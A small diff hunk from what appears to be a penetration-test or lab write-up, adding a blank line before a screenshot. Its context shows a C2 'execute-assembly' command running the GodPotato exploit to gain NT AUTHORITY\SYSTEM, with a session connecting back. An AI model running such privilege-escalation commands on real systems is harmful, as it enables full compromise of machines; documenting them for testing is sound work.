@@ -146,4 +146,5 @@ execute-assembly /home/rosskeddy/tools/potatos/GodPotato-NET4.exe -cmd "C:\Temp\
 ```
 
 The session connects back immediately and launching the interactive shell reveals `NT AUTHORITY\SYSTEM` is obtained - fully compromising the environment.
+
 ![Executing the GodPotato to Escalate Privileges to NT AUTHORITY](./screenshots/potato.png)
